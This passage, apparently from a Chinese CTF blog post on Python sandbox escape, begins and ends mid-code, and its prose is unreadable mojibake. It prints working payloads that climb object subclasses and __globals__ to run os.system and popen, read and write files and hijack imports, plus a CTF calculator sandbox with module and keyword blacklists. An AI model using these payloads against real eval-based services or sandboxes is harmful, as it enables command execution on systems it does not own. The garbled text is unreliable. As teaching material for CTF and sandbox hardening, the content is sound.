class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)<br>(<span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)<br>(<span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)<br>(<span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)<br>(<span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)<br>(<span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)<br>(<span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;)<br>(<span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;)<br>(<span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;)<br>(<span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;)<br>(<span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;)<br>(<span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;)<br>(<span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)<br>(<span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;)<br>(<span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)<br>(<span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)<br>(<span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)<br>(<span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)<br>(<span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)<br>(<span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œsite å°±åœ¨é‡Œé¢ï¼Œä»¥ 2.x çš„<code>site._Printer</code>ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>os åˆå›æ¥äº†ã€‚å¹¶ä¸” site ä¸­è¿˜æœ‰ <code>__builtins__</code>ã€‚</p><p>è¿™ä¸ªæ–¹æ³•ä¸ä»…é™äº A-&gt;osï¼Œè¿˜é˜”ä»¥æ˜¯ A-&gt;B-&gt;osï¼Œæ¯”å¦‚ 2.x ä¸­çš„ <code>warnings</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<br>&lt;module <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>warnings</code>è¿™ä¸ªåº“ä¸­æœ‰ä¸ªå‡½æ•°ï¼š<code>warnings.catch_warnings</code>ï¼Œå®ƒæœ‰ä¸ª<code>_module</code>å±æ€§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, record=<span class="hljs-literal">False</span>, module=<span class="hljs-literal">None</span></span>):<br>...<br>        <span class="hljs-variable language_">self</span>._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> module isNoneelse module<br>...<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é€šè¿‡<code>_module</code>ä¹Ÿå¯ä»¥æ„é€  payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>).__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>][<span class="hljs-number">0</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>3.x ä¸­çš„<code>warnings</code>è™½ç„¶æ²¡æœ‰ <code>linecache</code>ï¼Œä¹Ÿæœ‰<code>__builtins__</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>å¦‚æœobjectæ²¡è¢«è¿‡æ»¤è¿˜å¯ä»¥è¿™æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨<code>builtin_function_or_method</code> çš„ <code>__call__</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__getattribute__(<span class="hljs-string">&#x27;append&#x27;</span>).__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">dict</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, <span class="hljs-variable language_">self</span>).keys.__class__.__call__(<span class="hljs-built_in">eval</span>, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        <span class="hljs-comment"># å¦‚æœæ˜¯ 3.x çš„è¯å¯ä»¥ç®€å†™ä¸ºï¼š</span><br>        <span class="hljs-comment"># super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))</span><br>test()<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™äº›åˆ©ç”¨æ–¹å¼æ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡<code>__class__</code>ã€<code>__mro__</code>ã€<code>__subclasses__</code>ã€<code>__bases__</code>ç­‰ç­‰å±æ€§&#x2F;æ–¹æ³•å»è·å– <code>object</code>ï¼Œå†æ ¹æ®<code>__globals__</code>æ‰¾å¼•å…¥çš„<code>__builtins__</code>æˆ–è€…<code>eval</code>ç­‰ç­‰èƒ½å¤Ÿç›´æ¥è¢«åˆ©ç”¨çš„åº“ï¼Œæˆ–è€…æ‰¾åˆ°<code>builtin_function_or_method</code>ç±»&#x2F;ç±»å‹<code>__call__</code>åç›´æ¥è¿è¡Œ<code>eval</code>ã€‚</p><h2 id="æ–‡ä»¶è¯»å†™"><a href="#æ–‡ä»¶è¯»å†™" class="headerlink" title="æ–‡ä»¶è¯»å†™"></a>æ–‡ä»¶è¯»å†™</h2><p>2.x æœ‰ä¸ªå†…å»ºçš„ <code>file</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ª <code>open</code>ï¼Œ2.x ä¸ 3.x é€šç”¨ã€‚</p><p>è¿˜æœ‰ä¸€äº›åº“ï¼Œä¾‹å¦‚ï¼š<code>types.FileType</code>(rw)ã€<code>platform.popen</code>(rw)ã€<code>linecache.getlines</code>(r)ã€‚</p><p>ä¸ºä»€ä¹ˆè¯´å†™æ¯”è¯»å±å®³å¤§å‘¢ï¼Ÿå› ä¸ºå¦‚æœèƒ½å†™ï¼Œå¯ä»¥å°†ç±»ä¼¼çš„æ–‡ä»¶ä¿å­˜ä¸º<code>math.py</code>ï¼Œç„¶å import è¿›æ¥ï¼š math.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><p>è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br>admin<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œ py æ–‡ä»¶å‘½åæ˜¯æœ‰æŠ€å·§çš„ã€‚ä¹‹æ‰€ä»¥è¦æŒ‘ä¸€ä¸ªå¸¸ç”¨çš„æ ‡å‡†åº“æ˜¯å› ä¸ºè¿‡æ»¤åº“åå¯èƒ½é‡‡ç”¨çš„æ˜¯ç™½åå•ã€‚å¹¶ä¸”ä¹‹å‰è¯´è¿‡æœ‰äº›åº“æ˜¯åœ¨<code>sys.modules</code>ä¸­æœ‰çš„ï¼Œè¿™äº›åº“æ— æ³•è¿™æ ·åˆ©ç”¨ï¼Œä¼šç›´æ¥ä»<code>sys.modules</code>ä¸­åŠ å…¥ï¼Œæ¯”å¦‚<code>re</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;math&#x27;</span><span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">False</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>å½“ç„¶åœ¨<code>import re</code> ä¹‹å‰<code>del sys.modules[&#39;re&#39;]</code>ä¹Ÿä¸æ˜¯ä¸å¯ä»¥â€¦</p><p>æœ€åï¼Œè¿™é‡Œçš„æ–‡ä»¶å‘½åéœ€è¦æ³¨æ„çš„åœ°æ–¹å’Œæœ€å¼€å§‹çš„é‚£ä¸ªéå†æµ‹è¯•çš„æ–‡ä»¶ä¸€æ ·ï¼šç”±äºå¾…æµ‹è¯•çš„åº“ä¸­æœ‰ä¸ªå« <code>test</code>çš„ï¼Œå¦‚æœæŠŠéå†æµ‹è¯•çš„æ–‡ä»¶ä¹Ÿå‘½åä¸º testï¼Œä¼šå¯¼è‡´é‚£ä¸ªæ–‡ä»¶è¿è¡Œ 2 æ¬¡ï¼Œå› ä¸ºè‡ªå·± import äº†è‡ªå·±ã€‚</p><p>è¯»æ–‡ä»¶æš‚æ—¶æ²¡ä»€ä¹ˆå‘ç°ç‰¹åˆ«çš„åœ°æ–¹ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯æ ¹æ®ä¸Šé¢çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤é‡‡ç”¨çš„ç»•è¿‡æ–¹æ³•å»å¯»æ‰¾ payload äº†ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin\n&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="è¿‡æ»¤äº†"><a href="#è¿‡æ»¤äº†" class="headerlink" title="è¿‡æ»¤äº†[]"></a>è¿‡æ»¤äº†[]</h2><p>ç”¨<code>pop</code>ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Š<code>a[0]</code>å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.func_globals.get(<span class="hljs-string">&#x27;linecache&#x27;</span>).os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br><span class="hljs-string">&#x27;kali\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="CTFé¢˜ç›®"><a href="#CTFé¢˜ç›®" class="headerlink" title="CTFé¢˜ç›®"></a>CTFé¢˜ç›®</h2><p>æ¥è‡ªiscc 2016çš„Pwn300 pycalc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():<br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;   Simple calculator implemented by python   &quot;</span><br>    <span class="hljs-built_in">print</span><span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getexp</span>():<br>    <span class="hljs-keyword">return</span> raw_input(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_import_</span>(<span class="hljs-params">name, *args, **kwargs</span>):<br>    module_blacklist = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>,<br>                        <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>,<br>                        <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>                        <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>,<br>                        <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>,<br>                        <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>,<br>                        <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>,<br>                        <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>,<br>                        <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> module_blacklist:<br>        <span class="hljs-keyword">if</span> name == forbid:        <span class="hljs-comment"># don&#x27;t let user import these modules</span><br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="hljs-built_in">format</span>(forbid))<br>    <span class="hljs-comment"># normal modules can be imported</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(name, *args, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>                 <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            return0<br>    return1<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_exec</span>(<span class="hljs-params">command</span>):<span class="hljs-comment"># sandbox user input</span><br>    result = <span class="hljs-number">0</span><br>    __sandboxed_builtins__ = <span class="hljs-built_in">dict</span>(__builtins__.__dict__)<br>    __sandboxed_builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="hljs-comment"># hook import</span><br>    <span class="hljs-keyword">del</span> __sandboxed_builtins__[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    _<span class="hljs-keyword">global</span> = &#123;<br>        <span class="hljs-string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__<br>    &#125;<br>    <span class="hljs-keyword">if</span> sandbox_filter(command) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span><span class="hljs-string">&#x27;Malicious user input detected!!!&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    command = <span class="hljs-string">&#x27;result = &#x27;</span> + command<br>    <span 